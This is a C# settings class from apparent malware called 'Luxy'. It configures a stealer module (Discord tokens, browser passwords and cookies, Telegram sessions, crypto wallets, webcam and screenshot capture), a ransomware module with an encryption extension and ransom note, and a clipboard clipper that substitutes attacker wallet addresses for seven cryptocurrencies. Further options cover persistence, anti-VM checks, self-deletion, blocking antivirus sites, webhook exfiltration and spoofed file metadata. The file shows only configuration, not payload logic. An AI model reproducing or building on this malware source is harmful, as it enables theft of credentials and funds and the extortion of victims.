using Luxy.Components.Utilities;

namespace Luxy
{
    internal static class Settings
    {
        // General Settings
        internal static string WebhookStealer { get; set; }
        internal static string Version { get; set; }
        internal static string Mutex { get; set; }

        internal static bool StealerModule { get; set; }
        internal static bool RansomewareModule { get; set; }
        internal static bool ClipperModule { get; set; }

        internal static bool Startup { get; set; }
        internal static bool AntiVm { get; set; }
        internal static bool Melt { get; set; }
        internal static bool BlockAvSites { get; set; }

        // Stealer Settings
        internal static bool StealDiscordToken { get; set; }
        internal static bool StealPasswords { get; set; }
        internal static bool StealCookies { get; set; }
        internal static bool StealGames { get; set; }
        internal static bool StealTelegramSessions { get; set; }
        internal static bool StealSystemInfo { get; set; }
        internal static bool Netwrok { get; set; }
        internal static bool StealWallets { get; set; }

        internal static bool TakeWebcam { get; set; }
        internal static bool TakeScreenshot{ get; set; }

        // Ransomeware Settings
        internal static string WebhookRansomeware { get; set; }
        internal static string EncryptExtension { get; set; }
        internal static string EncryptExtensionList { get; set; }
        internal static string ReadMeMessage { get; set; }
        internal static bool ShowReadMeMessage { get; set; }

        // Clipper Setttings
        internal static string WebhookClipper { get; set; }
        internal static string BtcAddr { get; set; }
        internal static string EthAddr { get; set; }
        internal static string DogeAddr { get; set; }
        internal static string LtcAddr { get; set; }
        internal static string DashAddr { get; set; }
        internal static string XmrAddr { get; set; }
        internal static string BchAddr { get; set; }

        internal static bool BtcClip { get; set; }
        internal static bool EthClip { get; set; }
        internal static bool DogeClip { get; set; }
        internal static bool LtcClip { get; set; }
        internal static bool DashClip { get; set; }
        internal static bool XmrClip { get; set; }
        internal static bool BchClip { get; set; }

        // Icon
        internal static string IconPath { get; set; }

        // Aessembly
        internal static string CompanyName { get; set; }
        internal static string Description { get; set; }
        internal static string ProductName { get; set; }
        internal static string LegalCopyright { get; set; }
        internal static string LegalTrademarks { get; set; }
        internal static string InternalName { get; set; }
        internal static string OriginalFilename { get; set; }

        static Settings()
        {
            Version = "1.0";
            Mutex = Common.GenerateRandomString(20);
        }

    }

}
